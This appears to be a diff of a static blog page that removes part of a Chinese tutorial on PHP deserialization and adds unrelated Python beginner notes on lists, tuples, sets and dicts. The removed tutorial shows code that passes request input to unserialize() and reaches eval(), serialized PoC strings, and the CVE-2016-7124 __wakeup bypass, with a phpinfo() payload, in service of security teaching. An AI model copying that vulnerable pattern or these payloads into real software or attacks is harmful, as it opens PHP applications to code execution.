class="string">&#x27;pass&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-16-1024x118.png" alt="img"></p>
-<p>__wakeup()：unserialize()函数会先检查是否存在__wakeup()魔术方法，存在则会先调用__wakeup()魔术方法。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 定义一个类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123; </span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;name&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$pass</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; pass = <span class="variable">$pass</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method. </span></span><br><span class="line">        <span class="variable language_">$this</span> -&gt; pass = <span class="variable language_">$this</span> -&gt; name; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$test</span> = <span class="string">&#x27;O:4:&quot;Test&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;monkey&quot;;s:3:&quot;age&quot;;i:18;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$test</span>));</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-17-1024x111.png" alt="img"></p>
-<p>__toString()：用于一个类被当做字符串时做出回应。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 定义一个类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __toString() method.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;__toString is OK&#x27;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-18-1024x109.png" alt="img"></p>
-<p>__toString()的触发方法：</p>
-<ol>
-<li><code>echo $obj</code>&#x2F;<code>print($obj)</code>时会触发</li>
-<li>反序列化对象和字符串拼接的时候会触发</li>
-<li>反序列化对象参与格式化字符串时触发</li>
-<li>反序列化对象与字符串进行&#x3D;&#x3D;比较时（PHP进行&#x3D;&#x3D;比较的时候会转换参数类型）</li>
-<li>反序列化对象参与格式化SQL语句，绑定参数时（这个暂时还不太理解）</li>
-<li>反序列化对象在经过php字符串处理函数触发</li>
-<li>在in_array()方法中，第一个参数时反序列化对象，第二个参数的数组中有__toString()返回的字符串的时候__toString()会被调用</li>
-<li>反序列化的对象作为class_exists()的参数的时候</li>
+</li>
+<li><p>列表的查询功能</p>
+<ul>
+<li>功能：查找指定元素在列表中的下标，如果找不到，会报错ValueError<ul>
+<li>语法：列表.index(元素)，index就是列表对象（变量）内置的方法（函数）</li>
+</ul>
+</li>
+<li>功能：统计某元素在列表中的数量<ul>
+<li>语法：列表.count(元素)</li>
+</ul>
+</li>
+<li>功能：统计列表内，有多少元素<ul>
+<li>语法：len(列表)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>列表的修改功能</p>
+<ul>
+<li>功能：修改特点位置（索引）的元素值<ul>
+<li>语法：列表[下标] &#x3D; 值</li>
+</ul>
+</li>
+<li>功能：插入元素<ul>
+<li>语法：列表.insert(下标,元素)，在指定的下标位置，插入指定的元素</li>
+</ul>
+</li>
+<li>功能：追加单个元素<ul>
+<li>语法：列表.append(元素)，将指定元素，追加到列表的尾部</li>
+</ul>
+</li>
+<li>功能：追加一批元素<ul>
+<li>语法：列表.extend(其他数据容器)，将其他数据容器的内容取出，依次追加到列表尾部</li>
+</ul>
+</li>
+<li>功能：元素的删除<ul>
+<li>语法1：del 列表[下标]</li>
+<li>语法2：列表.pop(下标)</li>
+</ul>
+</li>
+<li>功能：删除某元素在列表中的第一个匹配值<ul>
+<li>语法：列表.remove(元素)</li>
+</ul>
+</li>
+<li>功能：清空列表内容<ul>
+<li>语法：列表.clear()</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-172-1024x543.png"><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-173-1024x543.png"><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-174-1024x542.png"></p>
+<ul>
+<li>列表的特点<ul>
+<li>可以容纳多个元素</li>
+<li>可以容纳不同类型的元素</li>
+<li>数据是有序存储的（有下标序号）</li>
+<li>允许重复数据存在</li>
+<li>可以修改（增加或删除元素等）</li>
+</ul>
+</li>
+</ul>
+<h4 id="list的遍历"><a href="#list的遍历" class="headerlink" title="list的遍历"></a>list的遍历</h4><ul>
+<li>使用while循环对列表进行遍历</li>
+</ul>
+<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-175-1024x543.png"></p>
+<ul>
+<li>使用for循环来遍历列表</li>
+</ul>
+<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-176-1024x543.png"></p>
+<h4 id="数据容器：tuple（元组）"><a href="#数据容器：tuple（元组）" class="headerlink" title="数据容器：tuple（元组）"></a>数据容器：tuple（元组）</h4><ul>
+<li>元组一旦定义完成，就不可以被修改</li>
+<li>使用小括号定义变量</li>
+<li>元组定义单个元素的时候，后面需要加上一个括号</li>
+</ul>
+<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-1-1024x543.png"></p>
+<ul>
+<li>index()：查找某个元素，如果数据存在返回对应的下标，否则报错</li>
+<li>count()：统计某个数据在当前元组出现的次数</li>
+<li>len(元组)：统计元组内的元素个数</li>
+</ul>
+<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-2-1024x542.png"></p>
+<ul>
+<li>元组的遍历：while</li>
+<li>元组的遍历：for</li>
+</ul>
+<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-3-1024x541.png"></p>
+<ul>
+<li>注意事项<ul>
+<li>不可以修改元素的内容，否则会报错</li>
+<li>可以修改元组内的list的内容（修改元素、增加、删除、反转等）</li>
+</ul>
+</li>
+</ul>
+<h4 id="数据容器：str（字符串）"><a href="#数据容器：str（字符串）" class="headerlink" title="数据容器：str（字符串）"></a>数据容器：str（字符串）</h4><ul>
+<li>字符串也是支持下标索引的</li>
+<li>字符串是无法修改的数据容器</li>
+<li>index()：与前面的index是一样的</li>
+<li>字符串的替换<ul>
+<li>语法：字符串.replace(字符串1,字符串2)</li>
+<li>功能：将字符串内的全部：字符串1替换为字符串2</li>
+<li>注意：不是修改字符串本身，而是得到一个新字符串</li>
+</ul>
+</li>
+<li>字符串的切割<ul>
+<li>语法：字符串.split(分隔符字符串)</li>
+<li>功能：按照指定的分隔符字符串，将字符串划分为多个字符串，并存入列表对象中</li>
+<li>注意：字符串本身不变，而是得到了一个列表对象</li>
+</ul>
+</li>
+<li>字符串的规整操作（去前后指定字符串）<ul>
+<li>语法：字符串.strip(字符串)</li>
+<li>不传入参数默认去掉首尾空格</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-4-1024x542.png"></p>
+<ul>
+<li>统计字符串中某字符出现的次数：count()</li>
+<li>字符串的长度：len()</li>
+<li>遍历字符串：跟上面的一样</li>
+</ul>
+<h4 id="数据容器的切片"><a href="#数据容器的切片" class="headerlink" title="数据容器的切片"></a>数据容器的切片</h4><ul>
+<li>序列：内容连续、有序、可使用下标索引的一类数据容器</li>
+<li>列表、元组、字符串都可以视为序列</li>
+<li>切片：<ul>
+<li>概念：从一个序列中，取出来一个子序列</li>
+<li>语法：序列[起始下标:结束下标:步长]</li>
+<li>表示从序列中，从指定位置开始，依次取出元素，到指定位置结束，得到一个新序列</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-51-1024x540.png"></p>
+<h4 id="数据容器：set（集合）"><a href="#数据容器：set（集合）" class="headerlink" title="数据容器：set（集合）"></a>数据容器：set（集合）</h4><ul>
+<li><p>集合最大的特点结束不支持重复元素，并且内容是无序的</p>
+</li>
+<li><p>语法：使用<code>&#123;&#125;</code></p>
+</li>
+<li><p>集合的常用操作-修改</p>
+<ul>
+<li>集合是无序的，所以集合不支持下标索引访问，但是集合和列表一样，是允许被修改的</li>
+<li>添加新元素<ul>
+<li>add：集合.add(元素)</li>
+</ul>
+</li>
+<li>移除元素<ul>
+<li>remove：集合.remove(元素)</li>
+</ul>
+</li>
+<li>从集合中随机取出元素<ul>
+<li>pop：集合.pop()</li>
+<li>结果：会得到一个元素的结果，同时集合本身被修改，元素被移除。</li>
+</ul>
+</li>
+<li>清空元素<ul>
+<li>clear：集合.clear()</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>集合的常用操作</p>
+<ul>
+<li>取出两个集合的差集<ul>
+<li>语法：集合1.difference(集合2)</li>
+<li>功能：取出集合1和集合2的差集（集合1有而集合2没有的）</li>
+<li>结果：得到一个新集合，集合1和集合2不变</li>
+</ul>
+</li>
+<li>消除两个集合的差集<ul>
+<li>语法：集合1.difference_update(集合2)</li>
+<li>功能：对比集合1和集合2，在集合1内，删除和集合2相同的元素</li>
+<li>结果：集合1被修改，集合2不变</li>
+</ul>
+</li>
+<li>两个集合合并<ul>
+<li>集合.union(集合2)</li>
+<li>功能：将集合1和集合2组合成新集合</li>
+<li>结果：得到新集合，集合1和集合2不变</li>
+</ul>
+</li>
+<li>统计集合元素数量len<ul>
+<li>len(集合)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>遍历</p>
+<ul>
+<li>集合不支持下标索引，不能使用while循环</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-52-1024x539.png"></p>
+<h4 id="数据容器：dict（字典、映射）"><a href="#数据容器：dict（字典、映射）" class="headerlink" title="数据容器：dict（字典、映射）"></a>数据容器：dict（字典、映射）</h4><ul>
+<li>字典的定义<ul>
+<li>可以使用字典，实现用key取出value的操作</li>
+<li>定义：使用<code>&#123;&#125;</code>，不过存储的元素是一个个的<code>键值对</code>，dict也可以定义</li>
+<li>不可以使用下标索引，通过key值去得到value值</li>
+<li>字典的key和value可以是任意数据类型（key不可以为字典）</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-54-1024x539.png"></p>
+<ul>
+<li>字典的常用操作<ul>
+<li>新增元素<ul>
+<li>语法：字典[key]&#x3D;value</li>
+<li>结果：字典被修改，新增了元素</li>
+</ul>
+</li>
+<li>更新元素<ul>
+<li>语法：字典[key]&#x3D;value</li>
+<li>结果：字典被修改，元素被更新</li>
+<li>注意：字典key不可以重复，所以对已存在的key进行上述操作，就是更新value的值</li>
+</ul>
+</li>
+<li>删除元素<ul>
+<li>语法：字典.pop(key)</li>
+<li>结果：获取指定key的value，同时字典被修改，指定key的数据被删除</li>
+</ul>
+</li>
+<li>清空元素<ul>
+<li>字典.clear()</li>
+</ul>
+</li>
+<li>获取全部key<ul>
+<li>语法：字典.keys()</li>
+<li>结果：得到字典中的全部key</li>
+</ul>
+</li>
+<li>获取字典的元素数量<ul>
+<li>len()</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-56-1024x544.png"></p>
+<ul>
+<li>字典的特点总结：<ol>
+<li>可以容纳多个数据</li>
+<li>可以容纳不同类型的数据</li>
+<li>每一份数据都是key-value的键值对</li>
+<li>可以通过key获取value，key不可重复（重复会覆盖）</li>
+<li>不支持下标索引</li>
+<li>可以修改（增加或删除更新元素）</li>
 </ol>
-<p>__invoke()：当对象被当成函数调用的时候，__invoke()会被触发（适用版本：PHP&gt;5.1.0）</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 定义一个类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __invoke() method. </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__invoke is OK&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$test</span>();</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-19-1024x138.png" alt="img"></p>
-<p>__clone()：当使用clone关键字拷贝完成一个对象后，生成的新对象会自动调用__clone()。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 定义一个类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __clone() method. </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__clone is OK&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">clone</span> <span class="variable">$test</span>;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-20-1024x116.png" alt="img"></p>
-<h4 id="反序列化小练习"><a href="#反序列化小练习" class="headerlink" title="反序列化小练习"></a>反序列化小练习</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;monkey&#x27;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; var1 = <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; var1 -&gt; <span class="title function_ invoke__">fun</span>();</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello unserialize&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ev</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span> -&gt; var2);</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>
-
-<p>在这里，我们的目的是执行eval函数。所以我们要调用Ev类中的fun()函数，可以通过修改Test类中的var1的值来修改实例化对象。POC构造如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;monkey&#x27;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; var1 = <span class="keyword">new</span> <span class="title class_">Ev</span>();</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ev</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span> = <span class="string">&#x27;phpinfo();&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>(); </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-21-1024x454.png" alt="img"></p>
-<h4 id="wakeup绕过（CVE-2016-7124）"><a href="#wakeup绕过（CVE-2016-7124）" class="headerlink" title="__wakeup绕过（CVE-2016-7124）"></a>__wakeup绕过（CVE-2016-7124）</h4><p>__wakeup绕过：当序列化字符串中的对象属性个数大于实际的属性个数时会跳过__wakeup()的执行。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">phpversion</span>(); </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name !== <span class="string">&quot;admin&quot;</span>)&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker is No&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">0</span>); </span><br><span class="line">        &#125; <span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;Welcome admin&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getflag</span>(); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span> -&gt; test);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>我们要绕过检测，所以我们要将name的值赋予admin，test的值赋予我们想要的，这里以phpinfo为例</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; name = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; test = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>(); </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>序列化的字符串为：O:4:”Test”:2:{s:4:”name”;s:5:”admin”;s:4:”test”;s:10:”phpinfo();”;}</p>
-</blockquote>
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-22-1024x459.png" alt="img"></p>
-<p>但是这里会显示我们是hacker，所以这里就要使用到__wakeup的绕过了</p>
-<blockquote>
-<p>新的payload：</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;test&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-23-1024x459.png" alt="img"></p>
-<p>这里适用的版本：PHP5&lt;&#x3D;5.6.9或者PHP7&lt;&#x3D;7.0.9。</p>
-<h2 id="POP链的构造"><a href="#POP链的构造" class="headerlink" title="POP链的构造"></a>POP链的构造</h2><p>POP链是什么？<br>称为面向属性编程，用于上层语言构造特定调用链的方法。</p>
-<p>POP链是通过寻找程序中已经定义了或者能够动态加载的对象属性或函数方法，将一些可能的调用组合在一起形成一个完整的、有目的性的操作。</p>
-<p>其他的不说了，直接上题目吧。链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[MRCTF2020]Ezpop">https://buuoj.cn/challenges#[MRCTF2020]Ezpop</a></p>
-<p>题目WP链接：<a target="_blank" rel="noopener" href="https://www.threeyear.com.cn/archives/1370">buuctf-web【MRCTF 2020】Ezpop</a></p>
-<h2 id="Phar反序列化攻击"><a href="#Phar反序列化攻击" class="headerlink" title="Phar反序列化攻击"></a>Phar反序列化攻击</h2><h4 id="什么是phar"><a href="#什么是phar" class="headerlink" title="什么是phar"></a>什么是phar</h4><p>有过Java开发经验的人一定知道Jar文件。一个应用，包括所有的可执行、可访问的文件，都打包进了一个JAR文件里，使得部署过程十分简单。</p>
-<p>PHAR（“Php ARchive”）是PHP中类似于JAR的一种打包文件，在PHP&gt;5.3，phar后缀文件是默认支持的。我们要开启phar，要在php.ini中将<code>phar.readonly = 0</code>。</p>
-<h4 id="Phar的文件结构"><a href="#Phar的文件结构" class="headerlink" title="Phar的文件结构"></a>Phar的文件结构</h4><p>PHAR的文件结构主要由四部分组成：</p>
-<p>1.a stub</p>
-<p>可以理解成一个标志（相当于文件头）,格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面的内容不做限制，但是结尾必须是<code>__HALT_COMPILER();?&gt;</code>，否则无法识别为phar文件。</p>
-<p>2.a manifest describing the contents</p>
-<p>因为phar本质上是一种压缩文件，每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是攻击最核心的地方。</p>
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-24.png" alt="img"></p>
-<p>3.the file contents</p>
-<p>这是被压缩文件的内容。</p>
